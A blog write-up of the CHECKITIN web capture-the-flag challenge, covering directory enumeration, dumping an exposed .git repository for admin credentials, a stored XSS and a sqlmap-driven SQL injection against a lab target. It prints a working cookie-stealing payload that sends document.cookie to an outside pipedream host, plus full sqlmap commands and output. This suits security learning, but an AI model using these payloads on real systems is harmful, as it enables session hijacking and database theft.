---
layout: post
title: 2021-12-01-CHECKITIN-CTF
---
 
Intro: CHECKITIN-CTF

**Background**
The system itself is a not-so-well configured website with a login page. If you attempt to perform an authentication bypass on the target, you'll realize you'd not be able to carry out a username enumeration due to the generic message displayed on login error. However, a brute-forcing may still succeed due to its lack of brute-forcing mechanism (lock-out). These are simply from a pentesting perspective so to speak.
 
![image](https://user-images.githubusercontent.com/94167587/144215669-416e2ab0-9a3b-4965-bcb8-a094f6db4823.png)


Now back to the challenge, how do we enumerate further? While inspecting the source-code might help a little and we have just discussed above that a login brute-forcing will be a long and tedious process, it comes down to our usual type of web attack: Directory brute force.
I initially used gobuster to carry out directory brute force attacks on the server - the result is promising with many returned. However, it did take more time than I expected to find out what I really want. Further, I fell into a rabbit hole where there isn't anything else.
```
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://<target>
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/11/26 18:11:35 Starting gobuster
===============================================================
/images (Status: 301)
/search (Status: 301)
/login (Status: 301)
/admin (Status: 301)
/style (Status: 200)
/js (Status: 301)
/pm (Status: 301)
/inc (Status: 301)

```

**Flag One**

The luck of gobusting depends on the wordlist you chose, it's sometimes a lottery. *But if you jump to a conclusion based on one gobusting result, it's suicidal because it's just a quick confirmation bias one should not trick themselves into - happens a lot for an objectiveless test and therefore the try harder mentality comes into being so important - where pwning / brainstorming an attack flow usually give us a good direction*
Alternatively, if I switched to [nikto](https://cirt.net/Nikto2), which is supposed to be a more aggressive web scanner tool (ofz, don't do this if you are on an [OPSEC]( https://www.blackhillsinfosec.com/wp-content/uploads/2021/03/SLIDES_OPSECFundamentalsRemoteRedTeams-1.pdf) engagement), I am able to locate some more interesting file which brings us to the first flag.

*You still have a little bit more patient on the result thought, it wouldn’t come up so quickly*

```
nikto -h http://<target>
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          <targetIP>
+ Target Hostname:    <targetIP>
+ Target Port:        <targetPort>
+ Start Time:         2021-11-26 18:18:39 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: login/?clearcookie
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "192.[..snip..]".
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-59619: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
+ OSVDB-12184: /?=PHP[..snip..]: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHP[..snip..]2: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHP[..snip..]: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHP[..snip..]: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 1811744, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ 8732 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-11-26 18:49:59 (GMT-5) (1880 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


```

Looking at the Nikto result, a LOT of information we can get. First, it's definitely a php written server, is the version subject to any public exploit?; Second the version of apache, which by obligation we checked to the version and see if it is a vulnerable version; third, internal IP was discovered. 

Finally, a git repository folder .git is discovered, which has led to further compromise of the internal git commit source codes to the attacker. 
While the /.git/ directory itself remains hidden on the view of web browser, we are aware of the exposed git repository by the tool. 
The next step would be **HOW** could we exploit such vulnerability - At the time of the writing, the writer is aware of the two open-sources tools in relation of .git repository exploitation - [trufflehog](https://github.com/trufflesecurity/truffleHog) and [GitTools](https://github.com/internetwache/GitTools)
If you look at the hint of this CTF, the "dump" hint is very obvious. 

Leveraging the “Dumper” tool within GitTools, we are able to download as much as possible from the found .git repository of the targeted webserver. 
```
/gitdumper.sh http://<target>/.git/ dest-dir 
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/YY/XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[..snip..]
```

Accordingly, leveraging the “Extractor” tool within the GitTools, we are able to extract commits and the corresponding content from the .git repository where we can pull all the objects we want.

```
./extractor.sh /root/Desktop/GitTools-master/Dumper/dest-dir/ /root/Desktop/GitTools-master/Extractor/
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 6f4458d18811ae64178e83f6601a86c56d27cf0f
[+] Found folder: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin
[+] Found file: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin/adduser.php
[+] Found file: /root/Desktop/GitTools-master/Extractor//[..snip..]/admin/info
```
Now going through the git commits, we can see some hidden information (i.e. admin password to login)
![image](https://user-images.githubusercontent.com/94167587/143661014-5025407e-da74-40ee-a2b3-09087501910c.png)


The author of this CTF is obviously giving a big shoutout/respect to the mightiest fruit hacker from the East. 
Regardless, let's login and the first flag shall be captured easily.
 
![image](https://user-images.githubusercontent.com/94167587/144215771-a8d3a9a3-71a8-4676-839d-f321df370262.png)

**Flag Two**

Now that we are in, what else can we do? Usually when we are inside the application with an authenticated section (in real-world, often the white-box side of assessment), we observe the interactions between the server and the client (i.e looking into the requests and responses on the traffic) and see if anything abnormal / fall behind of security standard might come up. If you are looking for a good guide, I am sharing you the [OWASP-TOP10]( https://owasp.org/Top10/) the same way my first darklab colleague shared me 😊 

Let's spin up [PortSwigger’s]( https://portswigger.net/)  Burp Suite to see what's going on. Particularly we shall look at different functions of this application

![image](https://user-images.githubusercontent.com/94167587/144215880-41c2b93c-fc8e-4ba6-bd69-f6a255b01ddf.png)

What have you found so far? There is the usual user settings, and there is also the interesting **RECORDS** section where we can add records. Ideally, in a real test, we should make best efforts to test every risky function at a limited time. For the sake of this CTF, we need to tweak a little bit and scope-down where will our second flag be.
Looking at the hint for Flag 2 of this challenge, we know that the flag is XSS related. Further, the author has given us credentials in case we did not compromise flag 1. Combing these two, we are pretty sure it’s a function that only exist at a normal user interface (i.e. RECORD tab)
There’s a **Record List** and an **Add Record** function
 ![image](https://user-images.githubusercontent.com/94167587/144215936-031edf09-0b9b-4820-bfc9-b1600035b085.png)

 
Another hint does appear here and if we capture the post requests from adding records here, we do have the authority to amend the parameters and inject an XSS payload. 
```
POST /records.php?add HTTP/1.1

Host: [..snip..]:81

[..snip..]

Referer: http://[..snip..]:81/records.php?add

Content-Type: application/x-www-form-urlencoded

Content-Length: 14

Connection: close

Cookie: admin_session_id=025a68774f51d5a08c7b3017c0080068; session_id=1139611f4d8b251fad23b1e1415d529a

Upgrade-Insecure-Requests: 1

hrs=1&reason=1
```
While we are unable to amend the `hrs` parameter, it is possible to manipulate the `reason` parameter where we can inject something. But does it mean it would be necessarily executed on the server side?
We should always apply situational awareness, and consider what sort of controls the developers have already implemented. If we inject special characters e.g., the application will return a filtered record on the *Record List*

![image](https://user-images.githubusercontent.com/94167587/144216052-d5481222-8cc6-443b-bf57-5a4896619a63.png)

Evidently, we should apply URL encoding to bypass such controls and inject such payload into the **Record List** But what payload should we use? What is the logics here? Let’s take a look of the Links on the RECORD section page, it turns out there is a *Records Approval* for administrator 


![image](https://user-images.githubusercontent.com/94167587/144216081-efe6a6e6-66c7-4260-832a-b251cfdfcc28.png)

 
In particular, we can see these records would ultimately be sent to the Administrator 
 
I know, I know, orange is the administrator but is he the highest authority? 

![image](https://user-images.githubusercontent.com/94167587/144216111-f4c4ebf3-1b06-4b68-a59e-7ea0c6e4f801.png)

 
If we look at the Users Management of this application, we will know that we aren’t the biggest person….yet…

![image](https://user-images.githubusercontent.com/94167587/144216166-6a0ccd39-7f21-4542-bf07-2aece89d4020.png)

 
So we have to put ourselves into a situation where we want to attack the administrator, whether from demo1 or from orange; and if this payload is executed by another client, we were able to obtain their cookie. In real world, it’s how we do a Proof-of-Concept on the impact of an XSS attack 
*[Stored-XSS]*( https://portswigger.net/web-security/cross-site-scripting/stored)

Going back to the payload, special thanks to the training blog offered by [hkcertCTF2021] (https://training.hkcert21.pwnable.hk/) we can make use of [requestbin]( https://requestbin.com/) to host a site to capture a cookie that we are attempting to steal.

How do we craft a stored XSS payload in an attempt to steal one’s cookie? During the challenge, I have come across a number of good posts
-	https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
-	https://brutelogic.com.br/blog/xss101/

In this challenge, not only we have to be aware of the input filtering in place, which leads us to a certain level of URL encoding, we have to keep on trial and error to see if we can capture the document.cookie from the victim clients who visited this page of the application injected with stored XSS
*Step 1 - Proving XSS exist*
Initially, I tested the Record List with the encoded XSS payload to prove that I can capture a document.cookie

```
Upgrade-Insecure-Requests: 1

hrs=1&reason=%22%3e%3csvg%2fonload%3dalert%28document.cookie%29%3e
```
 ![image](https://user-images.githubusercontent.com/94167587/144216199-8b26bd47-b2f8-44e6-8ed4-2fbf29b7abeb.png)


*Step 2 – Proving XSS can send to our requestbin server*
Onload=fetch() is a good payload to perform such action
```
Upgrade-Insecure-Requests: 1

hrs=1&reason= %22%3e%3csvg%2fonload%3dfetch%60https%3a%2f%2fen8bq7uoc2g7wz3%2em%2epipedream%2enet%2f%3f%60%2bdocument.cookie%29%3e

```
 
![image](https://user-images.githubusercontent.com/94167587/144216221-7ca07c83-4bb9-4748-8cd9-2e44460bb6c0.png)

*Step 3 – Combining the both*
<svg onload=fetch( ' //HOST/?cookie= ' +document.cookie) is supposed to be a good payload. However, upon further trial and error, I realize a space or %20 is something this server does not like (input filtering). Worse, even if it succeeds sending to our requestbin server, document.cookie is not captured ☹ 
 
![image](https://user-images.githubusercontent.com/94167587/144216262-004691bb-fc7e-46d9-9752-1a9babe0d7a9.png)
![image](https://user-images.githubusercontent.com/94167587/144216310-119c2722-b257-450b-a0b8-3be74feb75a1.png)


What’s going on? I found this [article]( https://auth0.com/blog/cross-site-scripting-xss/) after and attempted amending my payload into /?data={document.cookie}
     ![image](https://user-images.githubusercontent.com/94167587/144216334-69c31051-3e26-4b73-806c-7847b3535cdf.png)

```
Upgrade-Insecure-Requests: 1

hrs=1&reason='%22%3e%3csvg%2fonload%3dfetch%28%60%2f%2fen8bq7uoc2g7wz3.m.pipedream.net%2f%3fcookie%3d%20%60%2bdocument.cookie%29%3e
```
And it works! 
An URL decoded look of my final payload looks like this:
'"><svg/onload=fetch(`https://XXX.m.pipedream.net/?data${document.cookie}`)>
 
 ![image](https://user-images.githubusercontent.com/94167587/144216345-4d5b8a2c-d58c-458d-9b91-cfd319e71200.png)

Voila~ Shouldn’t have taken me that long!

**Flag 3** 
Last but not least, flag 3 is about the formidable SQL injection, at least we know that from the hint given. And the fact that it requires Admin rights (via compromise of flag 1) is obvious that the injection point lies within one of the functions in Administrative panel.
 
![image](https://user-images.githubusercontent.com/94167587/144216370-13a1a70e-fbf7-4da4-99c1-2310fb3c1029.png)

*Part 1 – Enumeration*
Having said that, this is not an easy SQLi point to find. I have encountered such function while doing flag 2 but because of this it also blinded me from thinking that it is related to flag 3. In a real test, however, we should go through each of the functionality one by one (and systematically) so we won’t miss any. (or, for completeness since the client paid us for that)
I went through an awful lots of admin functions such as the Search function in Full Summary or Add User which I come across in testing because they are usually the weak spots. Yet, unfortunately, the injection points aren’t there. It’s until I revisit the Records Management I was able to discover a SQL injection point at the `Save Status` function. 
 

 ![image](https://user-images.githubusercontent.com/94167587/144216417-3fc52f85-58b0-4bdb-9c68-b6e6a8608b3a.png)

 
```
POST /admin/records.php?p=1& HTTP/1.1

Host: [..snip..]:81

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://[..snip..]:81/admin/records.php

Content-Type: application/x-www-form-urlencoded

Content-Length: 379
[..snip..]
status%5B1379%5D=0&change=Save+status
```
The response of such request has revealed a SQL error message after supplementing a ‘ , which tempted me to enumerate further.
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1352'' at line 1	
```
*SQLMap*
For this SQLi, I leverage the help from sqlmap, which comes in handy (also lazy). Many people would recommend a manual exploitation to understand SQLinjection, which I cannot agree more.

Step 1 – Confirming the injection point
I first save the request into a *search.req” file so I can parse the request easily when using SQLinjection
Next, I use the –current-user extension to confirm the injection point.
```
sqlmap -r search.req --current-user
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:18 /2021-11-30/

[19:03:18] [INFO] parsing HTTP request from 'search.req'
[19:03:18] [WARNING] provided value for parameter 'status[1379]' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[19:03:18] [INFO] resuming back-end DBMS 'mysql' 
[19:03:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: status[1379] (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: status[1379]=' AND EXTRACTVALUE(9600,CONCAT(0x5c,0x716a717871,(SELECT (ELT(9600=9600,1))),0x71716a7071)) AND 'HQrT'='HQrT&change=Save status
---
[19:03:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 7 (wheezy)
web application technology: Apache 2.2.22, PHP 5.4.45
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[19:03:19] [INFO] fetching current user
[19:03:19] [INFO] resumed: 'root@%'
current user: 'root@%'
[19:03:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/[..snip..]'

[*] ending @ 19:03:19 /2021-11-30/
```  
*Step 2 – Dumping the databases, then table content*
I made a mistake by trying to dump the table (i.e. flag) first, which wouldn’t succeed. Yes, I already know the table name “flag” from the CTF hint, but still, we have to go step by step.
 
![Uploading image.png…]()
 
  
 I made a good reference by reading a [CTF write-up post]( https://ctftime.org/writeup/24593) First, let’s list the databases 😊
```
sqlmap -r search.req --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:10:06 /2021-11-30/

[18:10:06] [INFO] parsing HTTP request from 'search.req'
[18:10:06] [WARNING] provided value for parameter 'status[1379]' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:10:06] [INFO] resuming back-end DBMS 'mysql' 
[18:10:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: status[1379] (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: status[1379]=' AND EXTRACTVALUE(5008,CONCAT(0x5c,0x7162627171,(SELECT (ELT(5008=5008,1))),0x71786b7a71)) AND 'MtZI'='MtZI&change=Save status
---
[18:10:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 7 (wheezy)
web application technology: PHP 5.4.45, Apache 2.2.22
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:10:07] [INFO] fetching database names
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[18:10:19] [INFO] retrie...
[18:10:49] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[18:10:50] [INFO] retrie...
[18:10:50] [INFO] retrie...
[18:10:53] [INFO] retrie...
available databases [4]:
[*] app
[*] information_schema
[*] mysql
[*] performance_schema

[18:10:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/[..snip..]

[*] ending @ 18:10:53 /2021-11-30/
```
Now that we know the databases’ name, we can dump the tables.
```
#sqlmap -r search.req -D app --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:11:47 /2021-11-30/

[18:11:47] [INFO] parsing HTTP request from 'search.req'
[18:11:48] [WARNING] provided value for parameter 'status[1379]' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:11:48] [INFO] resuming back-end DBMS 'mysql' 
[18:11:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: status[1379] (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: status[1379]=' AND EXTRACTVALUE(5008,CONCAT(0x5c,0x7162627171,(SELECT (ELT(5008=5008,1))),0x71786b7a71)) AND 'MtZI'='MtZI&change=Save status
---
[18:11:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 7 (wheezy)
web application technology: PHP 5.4.45, Apache 2.2.22
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:11:51] [INFO] fetching tables for database: 'app'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[18:11:56] [INFO] retrieved: 'flag'
[18:12:04] [INFO] retrieved: 'records'
[18:12:04] [INFO] retrieved: 'pm_index'
[18:12:05] [INFO] retrieved: 'errors'
[18:12:06] [INFO] retrieved: 'summary'
[18:12:07] [INFO] retrieved: 'admin_logon'
[18:12:14] [INFO] retrieved: 'temp'
[18:12:44] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[18:12:45] [INFO] retrieved: 'users'
[18:12:46] [INFO] retrieved: 'personal_info'
[18:12:46] [INFO] retrieved: 'notice'
[18:12:47] [INFO] retrieved: 'log'
[18:12:47] [INFO] retrieved: 'pm_content'
Database: app
[12 tables]
+---------------+
| log           |
| admin_logon   |
| errors        |
| flag          |
| notice        |
| personal_info |
| pm_content    |
| pm_index      |
| records       |
| summary       |
| temp          |
| users         |
+---------------+

[18:12:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/[..snip..]'
```
*Step 3 – Capture the Flag*
```
#sqlmap -r search.req -D app -T flag --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.10#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:14:17 /2021-11-30/

[18:14:17] [INFO] parsing HTTP request from 'search.req'
[18:14:17] [WARNING] provided value for parameter 'status[1379]' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[18:14:17] [INFO] resuming back-end DBMS 'mysql' 
[18:14:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: status[1379] (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: status[1379]=' AND EXTRACTVALUE(5008,CONCAT(0x5c,0x7162627171,(SELECT (ELT(5008=5008,1))),0x71786b7a71)) AND 'MtZI'='MtZI&change=Save status
---
[18:14:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 7 (wheezy)
web application technology: Apache 2.2.22, PHP 5.4.45
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[18:14:18] [INFO] fetching columns for table 'flag' in database 'app'
[18:14:18] [INFO] resumed: 'flag'
[18:14:18] [INFO] resumed: 'varchar(32)'
[18:14:18] [INFO] fetching entries for table 'flag' in database 'app'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[18:14:24] [INFO] retrieved: 'hackaday{d0u...
Database: app
Table: flag
[1 entry]
+--------------------------+
| flag                     |
+--------------------------+
| hackaday{[..snip..] |
+--------------------------+
```


Lastly, a lot of thanks to the designer of the CTF Challenge, It has been great fun. If you were in the real competition and come across a different approach and would like to exchange ideas, feel free to contact me :)😊

